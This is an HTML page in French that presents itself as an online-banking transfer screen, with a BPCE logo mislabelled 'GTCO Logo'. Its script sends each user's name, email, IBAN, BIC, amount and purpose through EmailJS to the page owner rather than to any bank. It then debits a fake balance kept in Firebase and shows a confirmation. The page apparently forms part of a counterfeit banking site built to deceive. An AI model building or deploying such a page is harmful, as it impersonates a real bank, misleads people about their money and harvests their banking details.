<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRA-qA72xvozFbPNv0kKMcdHb4AlGZM5FpthN8nGrERlEplcDXF-8sAzJM&s=10

" />

  </style>

  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>

  <script src="shared.js"></script>

</head>
<body class="bg-slate-50 text-slate-800 min-h-screen flex flex-col md:flex-row">

  <aside class="w-full md:w-64 bg-white border-r border-slate-200 p-6 flex flex-col justify-between md:sticky md:top-0 md:h-screen">
    <div>
      <div class="flex items-center space-x-2 text-blue-600 font-bold text-2xl mb-8">
        <div class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center text-white text-lg">
          <i class="fa-solid fa-feather-pointed"></i>
        </div>
        <img src="https://www.iobeya.com/wp-content/uploads/2022/07/bpce-logo.png" alt="GTCO Logo" class="h-6">
      </div>
      
      <nav class="space-y-1">
        <a href="dashboard.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-chart-pie w-5"></i>
          <span>Dashboard</span>
        </a>
        <a href="virement.html" class="flex items-center space-x-3 bg-blue-50 text-blue-600 p-3 rounded-xl font-medium transition">
          <i class="fa-solid fa-paper-plane w-5"></i>
          <span>Faire un virement</span>
        </a>
        <a href="ajouter-beneficiaire.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-user-plus w-5"></i>
          <span>Bénéficiaires</span>
        </a>
        <a href="historique.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-clock-rotate-left w-5"></i>
          <span>Historique</span>
        </a>
        <a href="mes-cartes.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-credit-card w-5"></i>
          <span>Mes cartes</span>
        </a>
        <a href="rib.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-building-columns w-5"></i>
          <span>Mon RIB</span>
        </a>
        <a href="profil.html" class="flex items-center space-x-3 text-slate-600 hover:bg-slate-50 p-3 rounded-xl transition">
          <i class="fa-solid fa-circle-user w-5"></i>
          <span>Mon Profil</span>
        </a>
      </nav>
    </div>

    <div class="mt-8 pt-4 border-t border-slate-100">
      <button onclick="logout()" class="w-full flex items-center space-x-3 text-red-500 hover:bg-red-50 p-3 rounded-xl transition font-medium text-left">
        <i class="fa-solid fa-arrow-right-from-bracket w-5"></i>
        <span>Déconnexion</span>
      </button>
    </div>
  </aside>

  <main class="flex-1 p-4 md:p-8 max-w-2xl mx-auto w-full space-y-6">
    
    <header>
      <h2 class="text-2xl md:text-3xl font-bold text-slate-900 tracking-tight">💸 Effectuer un Virement Bancaire</h2>
      <p class="text-slate-500 text-sm mt-1">Remplissez ce formulaire pour envoyer votre virement en toute sérénité 😊</p>
    </header>

    <div class="bg-gradient-to-r from-blue-600 to-indigo-700 text-white p-5 rounded-2xl flex justify-between items-center shadow-md">
      <div>
        <p class="text-xs text-blue-100/80 font-semibold uppercase tracking-wider">Votre solde disponible</p>
        <h3 id="balance-badge" class="text-2xl font-bold mt-1">Chargement...</h3>
      </div>
      <div class="w-12 h-12 bg-white/10 rounded-xl flex items-center justify-center text-xl backdrop-blur-md">
        <i class="fa-solid fa-wallet"></i>
      </div>
    </div>

    <form id="virement-form" onsubmit="sendEmail(event)" class="bg-white border border-slate-200 rounded-3xl p-6 md:p-8 space-y-5 shadow-sm">
      
      <div>
        <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Montant</label>
        <div class="relative">
          <input type="number" name="montant" id="virement-montant" placeholder="Ex : 1000" min="1" step="0.01" required 
                 class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 font-bold text-lg text-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
        </div>
      </div>

      <div>
        <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Motif</label>
        <input type="text" name="motif" placeholder="Ex : Paiement facture" required 
               class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
      </div>

      <div>
        <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">IBAN</label>
        <input type="text" name="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required 
               class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-mono uppercase tracking-wide focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
      </div>

      <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div>
          <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">BIC</label>
          <input type="text" name="bic" placeholder="Ex : BNPAFRPPXXX" required 
                 class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-mono uppercase focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
        </div>
        <div>
          <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Domiciliation</label>
          <input type="text" name="domiciliation" id="virement-domiciliation" placeholder="Nom de la banque" required 
                 class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
        </div>
      </div>

      <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div>
          <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Nom et Prénom</label>
          <input type="text" name="user_name" placeholder="Ex : Jean Dupont" required 
                 class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
        </div>
        <div>
          <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Email</label>
          <input type="email" name="user_email" placeholder="votre@email.com" required 
                 class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
        </div>
      </div>

      <div>
        <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Date d'exécution</label>
        <input type="date" name="date" id="virement-date" required 
               class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-sm font-medium text-slate-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition">
      </div>

      <button type="#" id="btn-submit" 
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-xl transition shadow-md shadow-blue-100 active:scale-98 flex items-center justify-center space-x-2 cursor-pointer">
        <span>✅ Envoyer le virement</span>
      </button>

    </form>

    <footer class="text-center text-xs text-slate-400 py-4 border-t border-slate-200">
      Mentions légales – Sécurité – Accessibilité – Plan du site
    </footer>

  </main>

  <script>
    // Initialisation immédiate d'EmailJS avec ta clé publique
    emailjs.init("0jPbcwuIUNfeT8fNu");

    // Variable locale pour retenir le solde actuel de l'utilisateur
    let currentBalance = 0;

    // Remplir automatiquement la date du jour par défaut
    document.getElementById('virement-date').value = new Date().toISOString().split('T')[0];

    // Écoute en temps réel du solde de l'utilisateur (Synchronisé via shared.js / currentUserId)
    db.collection("users").doc(currentUserId).onSnapshot((doc) => {
      if (doc.exists) {
        currentBalance = doc.data().balance || 0;
        // Utilisation de la fonction globale formatMoney() issue de shared.js
        document.getElementById('balance-badge').textContent = formatMoney(currentBalance);
      }
    });

    // Fonction d'envoi d'EmailJS et mise à jour Firestore
    async function sendEmail(event) {
      event.preventDefault();
      const form = event.target;
      const formData = new FormData(form);
      const btnSubmit = document.getElementById('btn-submit');
      const montant = parseFloat(formData.get("montant"));

      // 1. Vérification du solde avant traitement
      if (montant > currentBalance) {
        alert("❌ Solde insuffisant pour effectuer ce virement.");
        return;
      }

      // Changement de l'état du bouton
      btnSubmit.disabled = true;
      btnSubmit.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin mr-2"></i> Envoi du virement en cours...`;

      try {
        // 2. Envoi du formulaire via EmailJS
        await emailjs.sendForm("service_70s01pw", "template_6ihqz4w", form);

        // 3. Préparation de la nouvelle transaction pour l'historique
        const newTransaction = {
          id: "TX-" + Math.floor(Math.random() * 10000000),
          type: "Virement",
          label: `Virement vers ${formData.get("domiciliation")} - ${formData.get("motif")}`,
          amount: -montant,
          date: new Date().toISOString()
        };

        // 4. Débit et mise à jour de l'historique sur Firestore v8
        await db.collection("users").doc(currentUserId).update({
          balance: currentBalance - montant,
          history: firebase.firestore.FieldValue.arrayUnion(newTransaction)
        });

        // 5. Redirection vers la page de confirmation avec les paramètres URL
        const params = new URLSearchParams();
        for (const pair of formData.entries()) {
          params.append(pair[0], pair[1]);
        }
        window.location.href = "confirmation.html?" + params.toString();

      } catch (error) {
        alert("❌ Une erreur est survenue lors de l'opération : " + (error.message || JSON.stringify(error)));
        // Rétablir le bouton en cas d'erreur
        btnSubmit.disabled = false;
        btnSubmit.innerHTML = `<span>✅ Envoyer le virement</span>`;
      }
    }
  </script>
</body>
</html>
